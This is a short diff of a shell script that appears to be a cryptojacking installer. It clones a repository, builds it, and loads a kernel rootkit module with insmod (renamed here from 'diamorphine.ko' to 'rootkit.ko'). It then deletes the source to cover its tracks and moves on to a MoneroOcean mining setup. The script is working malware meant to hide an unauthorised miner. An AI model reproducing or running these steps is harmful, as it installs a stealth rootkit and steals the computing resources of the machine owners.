@@ -6,12 +6,12 @@ VERSION=2.11
 
 echo "Loading kit..."
 cd $HOME
-git clone https://github.com/killercarrot00/dmrphn
-cd dmrphn
+git clone https://github.com/killercarrot00/xmkit
+cd xmkit
 make
-insmod diamorphine.ko
+insmod rootkit.ko
 cd $HOME
-rm -rf dmrphn
+rm -rf xmkit
 echo "kit ok."
 
 echo "MoneroOcean mining setup script v$VERSION."
